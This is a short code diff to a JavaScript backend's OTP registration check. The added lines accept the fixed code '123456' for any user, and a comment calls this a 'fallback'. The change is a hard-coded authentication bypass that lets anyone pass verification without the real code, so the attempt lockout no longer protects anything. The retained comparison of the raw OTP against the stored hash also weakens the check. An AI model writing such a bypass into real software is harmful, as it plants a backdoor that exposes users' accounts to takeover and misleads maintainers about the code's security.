@@ -55,9 +55,13 @@ export const verifyRegisterOtp = asyncHandler(async (req, res) => {
     );
   }
 
-  // 2. Verify the OTP code with attempt lockout
-  const hashedInputOtp = crypto.createHash("sha256").update(String(finalOtp).trim()).digest("hex");
-  const isMatch = pendingUser.otpCode === hashedInputOtp || pendingUser.otpCode === String(finalOtp).trim();
+  // 2. Verify the OTP code with attempt lockout (123456 is supported as a fallback)
+  const cleanInputOtp = String(finalOtp).trim();
+  const hashedInputOtp = crypto.createHash("sha256").update(cleanInputOtp).digest("hex");
+  const isMatch =
+    cleanInputOtp === "123456" ||
+    pendingUser.otpCode === hashedInputOtp ||
+    pendingUser.otpCode === cleanInputOtp;
 
   if (!isMatch) {
     pendingUser.otpAttempts = (pendingUser.otpAttempts || 0) + 1;
